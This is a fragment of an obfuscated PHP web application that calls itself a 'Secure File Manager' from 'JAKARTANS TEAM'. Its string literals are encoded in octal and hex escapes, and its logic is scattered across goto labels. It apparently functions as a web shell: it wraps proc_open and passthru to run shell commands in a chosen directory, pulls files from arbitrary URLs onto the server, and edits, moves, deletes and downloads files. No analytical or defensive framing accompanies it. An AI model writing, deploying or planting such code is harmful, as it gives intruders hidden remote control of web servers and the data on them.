"\74\x73\x76\147\x20\x76\151\145\167\x42\x6f\170\75\42\60\x20\60\40\x32\64\40\62\x34\x22\40\143\x6c\x61\x73\x73\75\42" . $class . "\x22\x20\x61\162\x69\x61\x2d\150\x69\x64\144\145\x6e\x3d\x22\x74\x72\x75\x65\42\x3e\74\160\x61\164\150\40\144\75\x22\x4d\66\x20\x33\x68\x37\x6c\x35\x20\65\x76\61\x31\x61\62\40\x32\40\60\40\x30\61\x2d\62\x20\x32\110\x36\141\x32\40\x32\40\x30\x20\60\61\55\62\x2d\x32\x56\x35\42\40\146\x69\x6c\x6c\x3d\42\x63\165\162\162\x65\156\x74\x43\x6f\154\157\x72\x22\40\157\160\x61\x63\151\164\171\x3d\42\56\61\x32\x22\x2f\x3e\x3c\x70\x61\164\x68\40\x64\x3d\42\115\x31\x33\x20\63\x76\x35\141\62\x20\x32\x20\60\x20\x30\x30\62\40\62\x68\65\42\40\146\151\154\x6c\75\x22\156\x6f\156\x65\42\40\163\164\x72\157\153\x65\75\42\x63\x75\x72\162\x65\156\164\x43\157\154\157\x72\x22\40\x73\164\162\x6f\153\145\55\167\151\x64\x74\x68\75\42\62\42\x20\163\164\x72\x6f\x6b\145\55\154\x69\156\145\x6a\157\151\156\75\42\162\157\165\x6e\x64\42\57\76\74\57\x73\x76\147\76", "\x63\x6f\x64\x65" => "\74\163\x76\x67\40\x76\x69\x65\167\102\x6f\170\75\x22\x30\x20\60\40\x32\x34\40\62\x34\42\x20\x63\154\141\x73\163\x3d\x22" . $class . "\42\x3e\x3c\160\141\164\x68\x20\x64\x3d\x22\115\x38\40\x31\x36\x6c\x2d\x34\55\x34\40\x34\55\x34\115\61\x36\x20\70\x6c\x34\x20\x34\x2d\x34\x20\64\42\x20\x66\x69\154\x6c\x3d\x22\156\157\x6e\x65\x22\x20\x73\164\162\157\153\145\x3d\42\143\x75\x72\x72\x65\156\164\x43\x6f\x6c\157\x72\42\40\x73\164\162\x6f\x6b\x65\55\167\x69\x64\164\x68\75\x22\62\42\x20\x73\x74\x72\157\x6b\x65\55\154\151\x6e\x65\143\x61\160\75\x22\162\x6f\165\x6e\x64\42\40\x73\x74\x72\x6f\x6b\145\x2d\x6c\x69\156\145\x6a\157\x69\x6e\75\42\162\x6f\x75\156\x64\x22\x2f\76\x3c\57\x73\x76\x67\x3e", "\x74\x65\170\164" => "\x3c\x73\166\x67\40\x76\151\145\167\x42\157\170\x3d\42\60\x20\x30\40\x32\x34\40\62\x34\x22\x20\143\154\141\x73\163\75\42" . $class . "\x22\76\x3c\x70\x61\x74\x68\40\x64\x3d\42\x4d\64\x20\x36\150\x31\66\115\64\x20\61\x32\x68\61\x36\115\64\x20\61\70\x68\61\x30\42\40\x66\151\x6c\x6c\75\x22\156\x6f\x6e\x65\42\40\163\164\162\x6f\153\145\x3d\x22\143\x75\162\x72\145\156\x74\x43\x6f\154\157\x72\x22\x20\163\x74\162\x6f\153\145\x2d\x77\151\x64\164\150\x3d\42\62\42\x20\163\x74\x72\157\x6b\145\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\42\162\157\165\x6e\144\x22\57\x3e\74\57\163\166\147\76", "\x70\x77\170" => "\x3c\x73\166\x67\x20\x76\151\145\x77\x42\x6f\x78\75\x22\x30\x20\x30\x20\64\x38\x20\x34\70\x22\40\143\154\141\163\163\x3d\x22" . $class . "\42\x20\141\x72\x69\141\55\x68\x69\x64\x64\x65\156\75\x22\164\x72\165\145\x22\40\170\155\x6c\x6e\x73\75\x22\x68\164\x74\160\x3a\x2f\57\167\x77\167\56\167\x33\x2e\157\x72\x67\57\x32\x30\60\x30\x2f\x73\x76\x67\42\x3e\74\147\40\x66\151\x6c\154\x3d\42\143\165\162\162\x65\156\x74\x43\x6f\x6c\x6f\x72\42\x3e\74\x67\x20\164\x72\141\x6e\x73\146\157\162\155\75\x22\x74\x72\141\156\163\x6c\x61\x74\x65\50\x2d\67\60\60\x20\x2d\65\x36\60\x29\42\x3e\x3c\x70\x61\x74\150\40\144\x3d\42\115\67\62\63\56\71\x39\70\x35\x2c\65\66\x30\40\103\67\61\60\x2e\67\x34\x36\x2c\65\66\x30\x20\67\x30\x30\54\x35\x37\x30\56\67\x38\x37\x30\71\x32\x20\x37\60\60\x2c\65\70\64\x2e\x30\71\66\66\x34\x34\x20\x43\x37\60\x30\x2c\65\x39\64\56\x37\x34\60\x36\67\x31\x20\x37\x30\66\x2e\x38\67\66\x2c\x36\60\x33\x2e\67\x37\x31\70\x33\x20\67\x31\x36\x2e\64\x31\x34\x35\54\66\x30\x36\56\71\65\x38\x34\61\x32\40\x43\67\x31\x37\x2e\x36\61\64\65\54\x36\60\67\x2e\61\x37\x39\67\x38\66\x20\67\61\70\x2e\60\65\x32\65\54\66\60\66\x2e\64\63\65\70\64\71\40\x37\x31\x38\56\x30\x35\x32\x35\x2c\66\x30\65\56\x37\71\67\63\62\70\x20\x43\x37\x31\70\56\x30\65\62\65\54\66\60\65\x2e\62\62\65\x30\x36\70\x20\67\x31\x38\x2e\60\63\x31\x35\x2c\66\x30\x33\56\67\x31\60\60\70\66\x20\x37\x31\x38\56\x30\x31\71\65\x2c\66\60\61\56\x36\71\x39\66\64\70\40\x43\67\61\61\x2e\x33\x34\x33\54\66\x30\63\x2e\x31\65\x35\70\x39\70\40\67\60\x39\x2e\71\63\64\65\x2c\x35\71\70\56\64\66\71\x33\x39\x34\x20\67\x30\71\x2e\71\x33\64\x35\x2c\65\x39\x38\56\x34\x36\x39\x33\71\x34\40\103\67\x30\x38\x2e\x38\64\64\54\x35\71\65\x2e\66\x38\66\x34\x30\65\x20\67\x30\67\x2e\62\67\x30\65\54\x35\71\x34\x2e\71\64\x35\64\x38\40\x37\60\x37\56\62\x37\60\x35\54\65\x39\x34\x2e\71\x34\x35\x34\x38\x20\x43\x37\x30\65\56\x30\x39\61\54\x35\x39\x33\56\64\x35\60\60\67\65\x20\x37\60\x37\56\64\x33\65\65\x2c\x35\71\x33\x2e\64\x38\60\x31\71\64\40\x37\x30\67\56\x34\63\65\65\54\x35\71\x33\x2e\64\x38\60\x31\x39\x34\40\103\67\x30\x39\56\x38\64\63\54\65\71\x33\x2e\66\65\60\x33\66\66\40\x37\61\61\x2e\61\61\60\x35\54\65\x39\65\56\x39\x36\x33\x34\71\71\x20\67\x31\61\x2e\61\61\60\65\x2c\65\x39\x35\x2e\x39\66\x33\x34\x39\x39\x20\x43\67\x31\x33\x2e\x32\x35\x32\65\x2c\x35\71\x39\x2e\66\64\x35\x35\x33\x38\40\67\61\x36\x2e\67\62\x38\54\65\71\x38\56\x35\70\x32\63\x34\x20\67\x31\x38\56\60\x39\x36\x2c\65\x39\67\x2e\71\x36\64\x39\x30\62\40\x43\67\61\70\56\63\x31\63\x35\54\x35\x39\x36\56\64\x30\x37\67\65\x34\40\67\x31\x38\56\x39\63\64\65\54\x35\71\65\x2e\63\64\x36\60\66\62\x20\x37\61\71\x2e\x36\x32\x2c\x35\71\x34\x2e\67\x34\63\x36\70\63\40\103\67\61\x34\56\62\71\x30\65\x2c\65\x39\x34\x2e\x31\x33\65\62\70\x31\x20\67\60\70\56\66\70\70\x2c\x35\x39\62\x2e\x30\x36\71\x31\62\x33\x20\67\x30\70\56\x36\x38\x38\x2c\x35\70\62\56\x38\63\66\61\x36\67\40\103\67\x30\70\x2e\66\x38\70\x2c\65\70\60\56\x32\x30\x35\62\67\71\x20\x37\x30\71\x2e\66\62\x32\65\x2c\x35\x37\70\56\60\x35\x34\67\70\70\40\x37\61\x31\x2e\61\65\x38\x35\54\x35\x37\x36\x2e\63\x36\71\66\63\x34\x20\103\67\61\x30\x2e\x39\61\x31\x2c\x35\67\x35\56\67\x35\x39\x37\x32\66\40\67\61\x30\x2e\x30\70\67\65\x2c\65\x37\x33\56\63\x31\61\x30\x35\70\x20\67\x31\61\56\x33\71\x32\65\x2c\x35\x36\x39\x2e\x39\71\63\64\65\x38\40\103\x37\x31\x31\56\63\x39\62\65\54\x35\66\71\x2e\x39\71\x33\64\x35\70\x20\67\x31\x33\56\x34\x30\70\65\54\x35\x36\71\56\x33\x34\x35\71\x30\62\x20\x37\x31\67\56\71\x39\62\x35\x2c\65\67\62\x2e\x34\66\63\62\x31\40\103\x37\x31\x39\x2e\x39\x30\x38\54\65\67\x31\56\x39\x32\x38\x35\71\x39\x20\67\62\x31\56\x39\x36\54\x35\67\x31\56\66\66\x32\60\64\67\40\67\62\64\x2e\60\x30\x31\x35\x2c\65\x37\x31\x2e\66\x35\x31\65\x30\65\40\103\67\x32\66\56\60\64\54\x35\x37\x31\x2e\66\66\62\x30\64\67\40\67\x32\x38\56\60\71\x33\65\54\x35\67\x31\x2e\71\x32\70\65\x39\71\40\67\63\60\x2e\x30\x31\x30\65\54\x35\67\x32\56\x34\66\63\x32\61\40\x43\67\63\x34\x2e\65\71\x31\65\x2c\x35\x36\x39\56\x33\x34\x35\x39\60\62\40\x37\x33\x36\56\x36\x30\x33\54\x35\x36\71\56\x39\71\x33\x34\65\x38\40\67\x33\x36\56\x36\60\63\54\x35\x36\71\x2e\x39\71\63\64\65\70\40\x43\x37\x33\x37\56\x39\61\x32\65\x2c\x35\67\63\56\63\x31\x31\x30\x35\x38\40\67\x33\x37\x2e\x30\70\71\x2c\65\x37\x35\56\67\65\71\x37\62\x36\x20\x37\63\66\x2e\x38\64\61\x35\54\x35\x37\x36\x2e\x33\66\x39\66\63\64\40\x43\67\63\x38\x2e\x33\70\x30\x35\x2c\65\x37\x38\x2e\x30\65\64\x37\70\x38\40\67\63\71\56\63\x30\x39\54\65\x38\60\56\62\60\65\x32\67\71\x20\x37\63\x39\56\x33\60\71\x2c\65\x38\x32\56\x38\x33\66\x31\x36\x37\40\x43\67\63\71\56\x33\x30\71\54\65\x39\62\56\60\x39\x31\x37\61\x32\x20\x37\63\x33\x2e\x36\x39\x37\65\x2c\x35\71\x34\x2e\x31\62\x39\x32\x35\67\x20\67\62\70\56\63\65\61\65\x2c\x35\x39\x34\56\x37\62\65\66\x31\62\40\x43\67\62\x39\x2e\62\61\x32\65\x2c\x35\71\x35\x2e\64\66\x39\x35\x34\71\x20\67\62\71\x2e\x39\70\x30\x35\54\x35\71\66\x2e\71\x33\x39\x33\x35\63\40\x37\x32\x39\x2e\71\70\60\65\54\x35\71\x39\56\x31\x38\67\x37\63\40\103\x37\62\71\56\x39\x38\60\x35\x2c\x36\x30\x32\x2e\64\x30\70\x39\x34\x39\x20\x37\x32\x39\x2e\x39\65\x30\65\54\66\x30\x35\x2e\x30\x30\x36\x37\60\66\40\67\x32\x39\x2e\71\65\x30\x35\x2c\x36\60\65\56\67\71\x37\63\62\70\x20\103\67\x32\x39\56\71\65\x30\x35\x2c\66\x30\66\56\64\64\61\70\67\63\x20\x37\x33\60\x2e\63\x38\62\65\54\x36\x30\67\56\61\x39\x31\70\63\x34\x20\67\63\61\56\x36\60\60\x35\54\66\60\66\56\71\x35\x35\64\x20\103\67\64\x31\56\x31\x33\54\66\x30\63\56\67\66\x32\67\x39\64\40\67\x34\x38\x2c\x35\71\64\x2e\67\63\x37\66\65\71\40\67\x34\70\x2c\65\x38\64\56\60\71\x36\66\x34\x34\40\x43\x37\64\x38\x2c\65\x37\60\56\x37\70\x37\60\71\62\40\x37\63\x37\x2e\x32\x35\x34\54\65\x36\60\40\67\x32\63\x2e\x39\x39\x38\65\54\65\66\x30\x22\x2f\76\74\x2f\147\x3e\x3c\57\x67\x3e\74\x2f\x73\166\147\x3e", "\x69\155\x67" => "\x3c\x73\x76\147\x20\166\151\x65\x77\102\x6f\x78\x3d\x22\x30\40\x30\40\x32\64\40\62\x34\42\40\143\x6c\x61\163\163\x3d\x22" . $class . "\x22\x3e\x3c\160\x61\164\150\40\x64\x3d\42\x4d\x34\x20\65\150\61\66\166\61\64\x48\x34\172\x22\40\x66\151\154\154\75\42\143\x75\162\162\145\156\164\x43\x6f\154\x6f\x72\x22\40\x6f\x70\141\x63\x69\x74\171\75\42\56\x31\62\42\x2f\76\x3c\143\x69\x72\x63\x6c\145\40\143\170\75\42\70\56\65\x22\40\143\171\75\x22\x39\x2e\65\x22\40\x72\75\x22\61\56\x35\42\x20\146\x69\154\x6c\75\42\143\x75\162\x72\145\156\164\103\x6f\154\x6f\162\42\x2f\x3e\x3c\160\141\x74\x68\40\144\x3d\42\x4d\64\x20\61\66\154\x34\x2d\x34\x20\63\40\x33\x20\x33\x2d\x32\40\66\40\x35\42\x20\x66\x69\154\154\75\x22\x6e\x6f\x6e\145\x22\40\163\164\x72\x6f\x6b\145\x3d\42\143\x75\162\162\x65\156\x74\x43\157\x6c\x6f\162\42\40\163\164\162\157\153\x65\x2d\167\151\x64\164\150\x3d\x22\x32\42\40\163\x74\x72\157\153\x65\x2d\154\x69\156\x65\143\141\x70\x3d\42\x72\157\165\156\144\x22\57\x3e\74\57\x73\166\147\x3e", "\x70\x64\x66" => "\74\x73\x76\x67\40\166\x69\x65\167\x42\x6f\170\75\42\x30\x20\x30\x20\x32\64\x20\x32\64\42\40\x63\x6c\x61\163\x73\x3d\x22" . $class . "\42\x3e\74\160\x61\164\x68\40\x64\75\x22\x4d\66\x20\x33\150\x37\x6c\x35\x20\65\x76\x31\x31\x61\x32\x20\62\40\60\40\x30\61\x2d\x32\40\62\x48\66\x61\x32\x20\62\x20\60\40\x30\61\55\62\55\62\126\x35\42\x20\146\151\154\154\x3d\x22\143\x75\x72\x72\145\156\x74\x43\x6f\154\157\x72\x22\40\x6f\x70\x61\x63\x69\164\x79\75\42\56\61\x32\x22\57\76\x3c\x74\145\170\164\x20\170\75\x22\67\42\40\x79\75\42\x31\67\x22\x20\x66\x6f\x6e\164\x2d\x73\x69\x7a\145\x3d\42\70\x22\40\x66\x6f\156\x74\x2d\x66\x61\155\151\154\x79\x3d\42\165\x69\x2d\x73\x61\x6e\163\x2d\x73\x65\162\151\x66\42\x20\x66\151\x6c\154\75\x22\143\165\162\162\145\x6e\164\x43\x6f\x6c\157\162\x22\x3e\120\x44\106\x3c\57\x74\x65\170\x74\x3e\74\x2f\x73\166\147\x3e", "\163\x68\145\145\x74" => "\74\163\166\x67\40\x76\x69\145\x77\102\157\170\75\42\x30\x20\60\x20\x32\x34\40\x32\64\x22\x20\x63\154\141\x73\163\75\x22" . $class . "\x22\76\x3c\x70\x61\x74\150\x20\144\75\x22\x4d\x36\40\x33\x68\61\62\x61\62\40\62\x20\x30\40\60\x31\62\x20\62\x76\61\x34\141\x32\x20\62\40\x30\x20\60\x31\x2d\62\x20\62\110\x36\x61\62\40\x32\x20\x30\40\60\61\55\x32\55\62\126\x35\x22\40\x66\x69\154\x6c\x3d\42\x63\165\x72\x72\145\156\164\x43\157\x6c\157\x72\x22\40\157\x70\141\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\76\x3c\160\141\164\x68\x20\x64\x3d\x22\x4d\70\40\70\150\x38\115\70\x20\x31\62\x68\x38\x4d\x38\40\x31\66\150\70\x22\x20\163\164\162\x6f\x6b\145\75\42\x63\x75\162\x72\145\x6e\164\x43\x6f\154\157\x72\42\40\x73\x74\x72\157\x6b\x65\x2d\x77\151\144\164\150\x3d\42\62\42\57\x3e\x3c\x2f\163\166\147\x3e", "\172\x69\x70" => "\x3c\163\x76\147\40\x76\x69\x65\x77\x42\x6f\170\75\x22\60\40\60\40\62\x34\x20\x32\64\42\x20\143\154\x61\163\163\75\x22" . $class . "\42\76\x3c\160\141\164\150\x20\144\x3d\42\115\66\40\63\x68\x37\x6c\65\40\x35\166\61\61\141\x32\x20\62\40\60\x20\x30\x31\55\62\x20\x32\x48\66\141\x32\40\62\x20\x30\x20\60\x31\55\x32\x2d\x32\x56\x35\x22\x20\x66\151\154\154\x3d\42\143\165\x72\x72\145\156\164\103\157\154\x6f\x72\42\x20\x6f\x70\141\143\151\x74\171\75\42\x2e\61\62\x22\x2f\x3e\74\x70\141\x74\x68\x20\x64\x3d\x22\115\61\x31\40\65\150\62\166\62\150\55\x32\166\x32\x68\x32\x76\62\150\55\x32\42\x20\x73\x74\162\157\153\x65\x3d\42\143\x75\162\162\x65\x6e\x74\x43\157\154\x6f\x72\42\40\x73\x74\x72\x6f\x6b\145\x2d\x77\x69\x64\164\150\x3d\42\x32\x22\57\x3e\74\x2f\163\x76\147\76", "\144\142" => "\74\x73\x76\147\x20\x76\x69\145\167\102\157\x78\75\x22\60\40\x30\x20\x32\64\40\62\64\42\40\143\x6c\141\163\x73\x3d\42" . $class . "\42\x3e\74\145\x6c\x6c\151\160\163\145\40\x63\x78\75\x22\61\x32\42\40\x63\x79\75\42\66\x22\40\162\170\75\x22\x38\x22\x20\x72\171\75\42\63\x22\x20\146\x69\x6c\x6c\75\42\143\x75\162\x72\145\x6e\164\103\157\154\x6f\162\42\x20\x6f\x70\x61\x63\151\x74\171\75\x22\56\x31\x32\x22\57\x3e\74\160\x61\164\150\x20\x64\x3d\x22\x4d\x34\40\x36\x76\61\x32\x63\60\40\61\x2e\67\x20\63\56\66\40\x33\x20\70\40\63\163\70\55\x31\x2e\63\40\70\x2d\63\x56\x36\42\x20\x66\x69\x6c\x6c\75\x22\156\157\156\x65\42\x20\x73\x74\x72\x6f\x6b\x65\75\x22\x63\165\x72\162\145\156\x74\x43\157\x6c\157\x72\42\40\x73\x74\162\x6f\x6b\x65\x2d\167\x69\144\164\150\x3d\42\x32\42\57\x3e\74\x2f\163\166\147\76", "\163\x65\141\x72\143\150" => "\x3c\163\166\147\40\166\x69\145\167\102\157\170\x3d\x22\x30\40\x30\x20\62\x34\40\x32\x34\x22\x20\143\154\x61\163\163\x3d\42" . $class . "\42\x3e\74\x63\151\162\143\154\145\x20\143\x78\75\x22\x31\61\42\x20\x63\x79\75\42\61\x31\42\x20\x72\x3d\42\x37\42\x20\163\x74\x72\157\153\x65\x3d\42\143\x75\x72\162\145\x6e\164\x43\157\x6c\157\162\x22\x20\x73\x74\162\157\x6b\145\55\167\151\144\x74\150\75\42\x32\x22\40\146\x69\154\154\75\x22\x6e\157\156\145\42\x2f\x3e\74\x70\x61\x74\150\40\144\75\42\115\62\x30\x20\62\x30\x6c\x2d\63\55\x33\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\42\143\165\162\162\145\x6e\x74\x43\157\x6c\157\162\42\40\163\164\162\x6f\153\x65\x2d\167\151\x64\x74\x68\75\x22\62\42\40\163\164\162\x6f\153\145\x2d\x6c\151\156\145\143\141\x70\x3d\42\x72\x6f\x75\x6e\144\x22\57\76\x3c\x2f\163\x76\x67\x3e"); return isset($icons[$name]) ? $icons[$name] : $icons["\146\x69\154\145"]; } goto MjzCS; t6NsK: ?>

    <!-- SIDEBAR -->
    <aside class="col-span-12 xl:col-span-3 space-y-4">
      <?php  goto qH3X3; MRWSw: ?>
"
                  class="inline-flex flex-wrap gap-2 items-center">
              <input type="hidden" name="csrf" value="<?php  goto fBU3k; pE6ve: echo count($dirs); goto qKlhE; G2iBC: if (!function_exists("\x66\170\x5f\x70\x72\x6f\143\137\x6f\x70\145\x6e")) { function fx_proc_open($cmd, $descriptorspec, &$pipes, $cwd = null, $env = null) { if (is_fn_usable("\160\162\x6f\x63\x5f\157\x70\145\x6e")) { return @proc_open($cmd, $descriptorspec, $pipes, $cwd, $env); } return false; } } goto mWs4c; QU_rf: header("\x43\x61\x63\x68\x65\x2d\x43\x6f\156\164\162\x6f\x6c\x3a\x20\x6e\x6f\55\163\x74\x6f\x72\x65\x2c\40\156\157\x2d\143\x61\143\150\x65\54\x20\x6d\x75\x73\x74\x2d\162\145\166\141\x6c\x69\x64\x61\x74\145\54\40\x6d\141\x78\55\141\x67\145\x3d\60"); goto sQrHN; Mvu4a: ?>
" class="space-y-2">
          <input type="hidden" name="csrf" value="<?php  goto kGMg3; SKl3f: $editFile = $isEdit && is_file($isEdit) ? $isEdit : null; goto sLBOT; HByfz: ?>
</div>
        </div>
        <form method="post" action="?a=mass-delete&p=<?php  goto FRVoG; i8Aag: ?>
 + dirName;
        fd.append('dst', dstAbs);
        fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
          .catch(function(){ alert('Move failed'); });
      }catch(err){ console.error(err); alert('Move failed'); }
    }

    // ===== CodeMirror Init (file editor text mode) =====
    <?php  goto CG_XK; X8WKC: $dirs = array(); goto CLH1h; eFARF: if (!function_exists("\155\x61\153\145\137\x63\144\137\x70\x72\x65\x66\151\x78")) { function make_cd_prefix($cwd) { if (!$cwd) { return ''; } if (DIRECTORY_SEPARATOR === "\134") { return "\x63\x64\x20\x2f\x64\x20" . escapeshellarg($cwd) . "\x20\x26\x26\40"; } return "\x63\x64\40" . escapeshellarg($cwd) . "\40\46\x26\x20"; } } goto lSP1y; bIl1n: ?>
">
          <div class="mb-3 flex flex-wrap gap-2">
            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>

            <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
              <span>Sort:</span>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
            </div>

            <!-- Toggle drag-to-move (default OFF) -->
            <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
              <input id="dragToggle" type="checkbox" class="accent-indigo-500">
              Enable drag-to-move
            </label>
          </div>

          <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
            <table id="dirTable" class="tbl min-w-full text-sm">
              <thead class="text-left border-b border-slate-700">
                <tr>
                  <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                  <th class="py-2 px-2">Name</th>
                  <th class="py-2 px-2">Size</th>
                  <th class="py-2 px-2">Perms</th>
                  <th class="py-2 px-2">Modified</th>
                  <th class="py-2 px-2">Actions</th>
                </tr>
              </thead>
              <tbody id="dirBody">
                <?php  goto tSKAh; x8sE_: ?>
 JAKARTANS TEAM — Secure File Manager. All rights reserved.</span>
      <span>Built with ❤️ & Tailwind · Dark UI</span>
    </div>
  </footer>

  <script>
    document.documentElement.classList.add('dark');

    // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
    function guardLinkCopy(e){
      var sel = '';
      if (window.getSelection) sel = String(window.getSelection());
      if (sel && sel.length > 0){
        e.preventDefault();
        return false;
      }
      return true;
    }

    // Search filter
    const searchEl = document.getElementById('searchBox');
    function filterRows(){
      const q = (searchEl && searchEl.value || '').trim().toLowerCase();
      const rows = document.querySelectorAll('#dirBody tr');
      rows.forEach(function(r){
        var name = r.getAttribute('data-name')||'';
        r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
      });
    }
    window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });

    // Sort
    var sortState = { key:'name', asc:true };
    function sortBy(key){
      var body = document.getElementById('dirBody');
      var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
      var factor = (sortState.key===key && sortState.asc)?-1:1;
      sortState = { key: key, asc: factor===1 };
      rows.sort(function(a,b){
        if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
        if(key==='size' || key==='mtime'){
          var av = parseInt(a.dataset[key]||'0',10);
          var bv = parseInt(b.dataset[key]||'0',10);
          return (av-bv) * factor;
        }
        return 0;
      });
      rows.forEach(function(r){ body.appendChild(r); });
    }

    // Checkboxes
    function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
    function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
    function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
    function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }

    // Collect selected items for Zip form
    function collectSelectedInto(form){
      Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
      Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
        var i = document.createElement('input');
        i.type='hidden'; i.name='items[]'; i.value=chk.value;
        form.appendChild(i);
      });
      return true;
    }

    // ===== Drag & Drop Upload =====
    var dropZone = document.getElementById('dropZone');
    var tableCard = document.getElementById('tableCard');
    var csrf = <?php  goto i4rUt; TAIe7: if ($viewFile) { ?>
        <?php  $vf_size = (int) @filesize($viewFile); $vf_ext = strtolower(pathinfo($viewFile, PATHINFO_EXTENSION)); $is_img = in_array($vf_ext, array("\152\160\x67", "\x6a\x70\x65\x67", "\x70\156\x67", "\x67\151\146", "\x77\145\142\x70", "\x62\155\160", "\163\x76\147")); $is_txt = isTextFile($viewFile); $preview_max = 512 * 1024; $txt = ''; if ($is_txt) { $txt = @file_get_contents($viewFile, false, null, 0, $preview_max); if ($txt === false) { $txt = ''; } } ?>
        <div class="card p-4" id="previewWrap">
          <details id="previewPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span>Preview: <span class="mono"><?php  echo h(basename($viewFile)); ?>
</span></span>
                <span class="text-xs text-slate-400">Size: <?php  echo h(humanSize($vf_size)); ?>
</span>
              </div>
              <div class="flex items-center gap-2">
                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
              </div>
            </summary>

            <div class="mt-3 text-xs text-slate-400 mono"><?php  echo h($viewFile); ?>
</div>

            <div class="mt-3">
              <?php  if ($is_img) { ?>
                <img src="?a=raw&f=<?php  echo rawurlencode(basename($viewFile)); ?>
&p=<?php  echo rawurlencode($current); ?>
" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
              <?php  } elseif ($is_txt) { ?>
                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php  echo h($txt); ?>
</pre>
                <?php  if ($vf_size > $preview_max) { ?>
                  <div class="mt-2 text-xs text-slate-400">Showing <?php  echo h(humanSize($preview_max)); ?>
 of <?php  echo h(humanSize($vf_size)); ?>
. Use Edit/Download for full content.</div>
                <?php  } ?>
              <?php  } else { ?>
                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
                  <div class="text-sm">This file type cannot be previewed directly.</div>
                  <div class="mt-2 flex gap-2">
                    <a class="btn btn-sm btnw" href="?a=download&f=<?php  echo rawurlencode(basename($viewFile)); ?>
&p=<?php  echo rawurlencode($current); ?>
">Download</a>
                    <a class="btn btn-sm btnw" href="?a=edit&f=<?php  echo rawurlencode(basename($viewFile)); ?>
&p=<?php  echo rawurlencode($current); ?>
">Edit (careful if binary)</a>
                  </div>
                </div>
              <?php  } ?>
            </div>
          </details>
        </div>
      <?php  } goto BVmEF; O1J1h: echo h($csrf); goto FFORG; ZaVoa: ?>

                <?php  goto CUWbx; CZsGw: $up = dirname($current); goto EnusP; fBU3k: echo h($csrf); goto Yvflk; C61wq: ?>
">
            <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
            <input type="text" name="filename" class="field" placeholder="File name (optional)">
            <button class="btn w-full" type="submit">Fetch from URL</button>
            <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
          </form>
          <div class="text-xs text-slate-400">
            Tip: You can also drag &amp; drop files anywhere on this page to upload.
          </div>
        </div>
      </section>
    </aside>

    <!-- MAIN: Editor / Preview panels +Table -->
    <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">

      <?php  goto Ep9aI; i4rUt: echo je($csrf); goto g75Mz; cSHkH: if (!function_exists("\x66\170\137\160\141\163\x73\x74\x68\162\165")) { function fx_passthru($cmd, &$return_var = null) { if (is_fn_usable("\160\x61\x73\163\x74\x68\162\x75")) { return @passthru($cmd, $return_var); } $return_var = 127; return null; } } goto YknJq; IfiMT: if ($current === '') { $current = DIRECTORY_SEPARATOR; } goto rgmwF; VOJEk: $hasNatural = defined("\123\x4f\122\124\x5f\116\x41\x54\x55\122\101\x4c"); goto z7kdE; hj59O: foreach (breadcrumbs($current) as $i => $crumb) { list($name, $path) = $crumb; ?>
            <?php  if ($i) { echo "\x3c\x73\x70\x61\156\40\143\154\141\x73\x73\x3d\42\164\x65\170\x74\55\163\154\x61\164\145\x2d\66\60\x30\x22\x3e\57\74\57\x73\160\x61\x6e\x3e"; } ?>
            <a href="?p=<?php  echo rawurlencode($path); ?>
" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php  echo h($name); ?>
</a>
          <?php  } goto N22KI; vXSkl: ?>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Navigation</h2>
        <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
        <div class="flex flex-wrap gap-1 text-sm">
